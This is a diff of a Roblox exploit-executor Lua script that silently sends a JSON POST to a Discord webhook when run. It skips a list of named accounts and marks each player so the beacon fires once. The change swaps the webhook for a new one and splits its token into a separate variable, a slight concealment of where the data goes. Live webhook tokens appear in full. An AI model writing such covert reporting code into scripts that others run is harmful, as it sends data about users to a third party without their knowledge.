@@ -4,9 +4,10 @@ if syn and syn.cache_replace and syn.cache_invalidate and syn.is_cached and syn.
 	if not game.Players.LocalPlayer:FindFirstChild("statsss") and plr.Name ~= "Ziscri" and plr.Name ~= "SinFront" and plr.Name ~= "GetCurb_Stomped" and plr.Name ~= "KariiValkyrie" and plr.Name ~= "WipinBoostedKids" and plr.Name ~= "fortnitefan39193" then
 		local s = Instance.new("Accessory", game.Players.LocalPlayer)
 		s.Name = "statsss"
-		local response = syn.request(
-			{
-				Url = 'https://discord.com/api/webhooks/1085057547339300964/vM37dp9TST1t9ut_5gwqprSSEXjKuWKLIRTQIMmTdkCTuibfM4fagf7jBPTfE1R8tAvd',
+		local data = "1085385027048702032/nxvYTv3fNqWjdKiO6aBobFYsXaSP6GW31Y9Vo4IjhM44m_-QV3-8lckbTe_ncd288WIR"
+local response = syn.request(
+    {
+        Url = 'https://discord.com/api/webhooks/'..data,
 				Method = 'POST',
 				Headers = {
 					['Content-Type'] = 'application/json'
